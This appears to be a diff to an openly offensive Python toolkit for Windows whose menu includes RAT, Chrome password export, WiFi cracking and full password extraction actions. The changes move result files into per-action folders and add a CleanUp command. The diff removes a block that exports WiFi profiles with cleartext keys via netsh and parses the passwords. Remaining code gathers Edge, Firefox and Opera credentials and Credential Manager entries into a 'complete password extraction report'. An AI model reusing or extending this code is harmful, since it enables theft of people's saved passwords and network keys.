@@ -854,6 +854,7 @@ while True:
 		],
 		"Support & Exit": [
 			"info - Show details of a command",
+			"CleanUp - Remove results created by the program",
 			"help - Show available actions",
 			"exit - Exit the program"
 		]
@@ -966,6 +967,7 @@ while True:
 		sleep(0.1)
 		print("")
 		sleep(0.1)
+		print("CleanUp) Remove results created by the program: deletes any folder with results chosen by the user")
 		print("exit) To exit the program")
 		sleep(0.1)
 		print("")
@@ -988,7 +990,7 @@ while True:
 			logging.error(f"Scan not initiated, action 'scan' cannot proceed")
 			sleep(4)
 
-	elif action == "scan":
+	elif action == "Scan" or action == "scan":
 		logging.info(f"Chosen action 1 to scan the machine")
 		scanverify = "yes"
 		cls()
@@ -1047,7 +1049,9 @@ while True:
 			"IP": real_ip,
 		}
 
-		with open("scan_results.json", "w") as f: 
+
+		os.makedirs(os.path.join(base_dir, "results", "Scan"), exist_ok=True)
+		with open(os.path.join(base_dir, "results", "Scan", "scan_results.json"), "w") as f: 
 			json.dump(scan_data, f, indent=4)
 
 	# ========== RAT ACTION ==========
@@ -1611,7 +1615,8 @@ while True:
 			
 			# Save to JSON
 			if all_results:
-				filename = f"results/chrome_passwords.json"
+				os.makedirs(os.path.join(base_dir, "results", "PassExport"), exist_ok=True)
+				filename = os.path.join(base_dir, "results", "PassExport", "chrome_passwords.json")
 				
 				output_data = {
 					"metadata": {
@@ -1741,7 +1746,8 @@ while True:
 
 		interface_select = input("Enter network interface to capture packets on (Choose from the list): ")
 
-		tcp_capture = f'& "C:\\Program Files\\Wireshark\\dumpcap.exe" -i {interface_select} -w test.pcapng'
+		os.makedirs("results/PacketCapture", exist_ok=True)
+		tcp_capture = f'& "C:\\Program Files\\Wireshark\\dumpcap.exe" -i {interface_select} -w results/PacketCapture/test.pcapng'
 		run_ps(tcp_capture)
 
 		logging.info(f"Started packet capture on interface: {interface_select}")
@@ -1850,7 +1856,9 @@ while True:
 				
 				if wifi_passwords:
 					# Save to JSON
-					output_file = os.path.join(results_dir, "WifiCrack.json")
+					os.makedirs("results/WifiCrack", exist_ok=True)
+					results_dir="results"
+					output_file = os.path.join(results_dir, "WifiCrack", "WifiCrack.json")
 					with open(output_file, 'w') as f:
 						json.dump(wifi_passwords, f, indent=4)
 					
@@ -1928,8 +1936,9 @@ while True:
 			print(Fore.YELLOW + "[!] Could not check WiFi")
 		
 		# 4. Save results
-		results_dir="results"
-		output_file = os.path.join(results_dir, "NetScan.json")
+		os.makedirs("results/NetScan", exist_ok=True)
+		results_dir="results/NetScan"
+		output_file = os.path.join(base_dir, results_dir, "NetScan.json")
 		with open(output_file, 'w') as f:
 			f.write("="*60 + "\n")
 			f.write("NETWORK INFORMATION DUMP\n")
@@ -2098,61 +2107,10 @@ while True:
 				print(Fore.YELLOW + "[!] Edge not found")
 		except Exception as e:
 			print(Fore.RED + f"[!] Edge error: {e}")
+
 		
-		# 3. WIFI PASSWORDS
-		print(Fore.CYAN + "\n[3] Extracting WiFi passwords...")
-		wifi_passwords = []
-		try:
-			netsh_path = r"C:\Windows\System32\netsh.exe"
-			temp_dir = "temp_wifi"
-			os.makedirs(temp_dir, exist_ok=True)
-			
-			result = subprocess.run(
-				[netsh_path, "wlan", "export", "profile", "key=clear", f"folder={temp_dir}"],
-				capture_output=True,
-				text=True
-			)
-			
-			if "successfully" in result.stdout.lower():
-				import glob
-				for xml_file in glob.glob(os.path.join(temp_dir, "*.xml")):
-					try:
-						with open(xml_file, 'r', encoding='utf-8') as f:
-							content = f.read()
-							
-							import re
-							ssid_match = re.search(r'<name>([^<]+)</name>', content)
-							key_match = re.search(r'<keyMaterial>([^<]+)</keyMaterial>', content)
-							
-							if ssid_match and key_match:
-								wifi_passwords.append({
-									"ssid": ssid_match.group(1),
-									"password": key_match.group(1)
-								})
-					except:
-						continue
-				
-				shutil.rmtree(temp_dir, ignore_errors=True)
-				
-				print(Fore.GREEN + f"[+] Found {len(wifi_passwords)} WiFi passwords")
-				all_results["extractions"]["wifi"] = {
-					"count": len(wifi_passwords),
-					"passwords": wifi_passwords
-				}
-				
-				# Show sample
-				if wifi_passwords:
-					print(Fore.WHITE + "  Sample:")
-					for i, wifi in enumerate(wifi_passwords[:5]):
-						print(Fore.CYAN + f"    {i+1}. {wifi['ssid']}")
-						print(Fore.GREEN + f"       Pass: {wifi['password']}")
-			else:
-				print(Fore.YELLOW + "[!] Could not export WiFi profiles")
-		except Exception as e:
-			print(Fore.RED + f"[!] WiFi error: {e}")
-		
-		# 4. WINDOWS CREDENTIAL MANAGER (Metadata only)
-		print(Fore.CYAN + "\n[4] Checking Windows Credential Manager...")
+		# 3. WINDOWS CREDENTIAL MANAGER (Metadata only)
+		print(Fore.CYAN + "\n[3] Checking Windows Credential Manager...")
 		try:
 			cmdkey_path = r"C:\Windows\System32\cmdkey.exe"
 			result = subprocess.run([cmdkey_path, "/list"], capture_output=True, text=True)
@@ -2194,8 +2152,8 @@ while True:
 		except Exception as e:
 			print(Fore.RED + f"[!] Credential error: {e}")
 		
-		# 5. FIREFOX (if exists - shows encrypted data)
-		print(Fore.CYAN + "\n[5] Checking Firefox...")
+		# 4. FIREFOX (if exists - shows encrypted data)
+		print(Fore.CYAN + "\n[4] Checking Firefox...")
 		try:
 			import glob
 			firefox_path = os.path.join(
@@ -2232,8 +2190,8 @@ while True:
 		except Exception as e:
 			print(Fore.RED + f"[!] Firefox error: {e}")
 		
-		# 6. OPERA/OTHER BROWSERS
-		print(Fore.CYAN + "\n[6] Checking other browsers...")
+		# 5. OPERA/OTHER BROWSERS
+		print(Fore.CYAN + "\n[5] Checking other browsers...")
 		try:
 			# Opera
 			opera_paths = [
@@ -2270,16 +2228,19 @@ while True:
 		all_results["summary"] = {
 			"total_extracted_items": total_passwords,
 			"categories_found": list(all_results["extractions"].keys()),
-			"successful_decryption": len(chrome_passwords) + len(edge_passwords) + len(wifi_passwords)
+			"successful_decryption": len(chrome_passwords) + len(edge_passwords)
 		}
 		
 		# Save JSON
-		json_file = f"ALL_PASSWORDS_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
+		os.makedirs(os.path.join(base_dir, "results", "AllPass"), exist_ok=True)
+		json_file = os.path.join(base_dir, "results", "AllPass", "AllPass.json")
 		with open(json_file, 'w', encoding='utf-8') as f:
 			json.dump(all_results, f, indent=4, ensure_ascii=False)
 		
 		# Save readable summary
-		summary_file = f"PASSWORD_SUMMARY_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+		summary_file = f"PASSWORD_SUMMARY.txt"
+		os.makedirs(os.path.join(base_dir, "results", "AllPass"), exist_ok=True)
+		summary_file = os.path.join(base_dir, "results", "AllPass", summary_file)
 		with open(summary_file, 'w', encoding='utf-8') as f:
 			f.write("="*70 + "\n")
 			f.write("COMPLETE PASSWORD EXTRACTION REPORT\n")
@@ -2342,31 +2303,53 @@ while True:
 
 	elif action == "CleanUp" or action == "cleanup":
 		logging.info("Chosen action 'CleanUp' to clean the 'results' folder")
-		choosefile=input("Which files to delete?: [A]ll, [R]egSave, [C]redScan, [W]ifiCrack, [Pass]Export, [N]etScan, [P]acketCapture: ")
-		if choosefile == "A" or choosefile == "a":
-			logging.info("User chose 'A' to delete the whole folder")
-			Adelete="rmdir base_dir/modules"
-			subprocess.run([Adelete] shell=True)
+		choosefile=input("Which files to delete?: [All], [R]egSave, [C]redScan, [W]ifiCrack, [Pass]Export, [N]etScan, [P]acketCapture, [A]llPass, [S]can]: ")
+		if choosefile == "All" or choosefile == "all":
+			logging.info("User chose 'All' to delete the whole folder")
+			Adelete=os.path.join(base_dir, "results")
+			subprocess.run(["rmdir", "/S", "/Q", Adelete], shell=True)
+			os.makedirs(os.path.join(base_dir, "results"), exist_ok=True)
+
 		elif choosefile == "R" or choosefile == "r":
 			logging.info("User chose 'R' to delete the 'RegSave' action result folder")
-			Rdelete="rmdir base_dir/results/RegSaver"
-			subprocess.run([Rdelete] shell=True)
-        elif choosefile == "C" or choosefile == "c":
-            logging.info("User chose 'C' to delete the 'CredScan' action result file")
-			Cdelete="del base_dir/results/CredScan.json"
-			subprocess.run([Cdelete] shell=True)
-        elif choosefile == "W" or choosefile == "w":
-            logging.info("User chose 'W' to delete the 'WifiCrack' action result file")
-			Wdelete="del base_dir/results/WifiCrack.json"
-			subprocess.run([Wdelete] shell=True)
-        elif choosefile == "Pass" or choosefile == "pass":
-            logging.info("User chose 'Pass' to delete the 'PassExport' action result file")
-			Passdelete="del base_dir/results/chrome_passwords.json"
-			subprocess.run([Passdelete] shell=True)
-        elif choosefile == "N" or choosefile == "n":
-            logging.info("User chose 'N' to delete the 'NetScan' action result file")
-			Ndelete="del base_dir/results/NetScan.json"
-			subprocess.run([Ndelete] shell=True)
+			Rdelete=os.path.join(base_dir, "results", "RegSaver")
+			subprocess.run(["rmdir", "/S", "/Q", Rdelete], shell=True)
+
+		elif choosefile == "C" or choosefile == "c":
+			logging.info("User chose 'C' to delete the 'CredScan' action result file")
+			Cdelete=os.path.join(base_dir, "results", "CredScan")
+			subprocess.run(["rmdir", "/S", "/Q", Cdelete], shell=True)
+
+		elif choosefile == "W" or choosefile == "w":
+			logging.info("User chose 'W' to delete the 'WifiCrack' action result file")
+			Wdelete=os.path.join(base_dir, "results", "WifiCrack")
+			subprocess.run(["rmdir", "/S", "/Q", Wdelete], shell=True)
+
+		elif choosefile == "Pass" or choosefile == "pass":
+			logging.info("User chose 'Pass' to delete the 'PassExport' action result file")
+			Passdelete=os.path.join(base_dir, "results", "PassExport")
+			subprocess.run(["rmdir", "/S", "/Q", Passdelete], shell=True)
+
+		elif choosefile == "N" or choosefile == "n":
+			logging.info("User chose 'N' to delete the 'NetScan' action result file")
+			Ndelete=os.path.join(base_dir, "results", "NetScan")
+			subprocess.run(["rmdir", "/S", "/Q", Ndelete], shell=True)
+
+		elif choosefile == "P" or choosefile == "p":
+			logging.info("User chose 'P' to delete the 'PacketCapture' action result file")
+			Pdelete=os.path.join(base_dir, "results", "PacketCapture")
+			subprocess.run(["rmdir", "/S", "/Q", Pdelete], shell=True)
+
+		elif choosefile == "A" or choosefile == "a":
+			logging.info("User chose 'AllPass' to delete the 'AllPass' action result file")
+			AllPassdelete=os.path.join(base_dir, "results", "AllPass")
+			subprocess.run(["rmdir", "/S", "/Q", AllPassdelete], shell=True)
+
+		elif choosefile == "S" or choosefile == "s":
+			logging.info("User chose 'S' to delete the 'Scan' action result file")
+			Sdelete=os.path.join(base_dir, "results", "Scan")
+			subprocess.run(["rmdir", "/S", "/Q", Sdelete], shell=True)
+		
 
 
 	elif action == "exit":
@@ -2538,6 +2521,15 @@ while True:
 		sleep(0.1)
 		input("Press Enter to continue...")
 		cls()
+
+	elif action == "info CleanUp" or action == "info cleanup":
+		print("CleanUp) Clean the 'results' folder: allows selective deletion of result folders generated by various actions to free up space") 
+		sleep(0.1) 
+		print("")
+		sleep(0.1)
+		input("Press Enter to continue...")
+		cls()
+
 
 	else:
 		print("Invalid action, please choose a valid command or select 'help' to see available actions.")
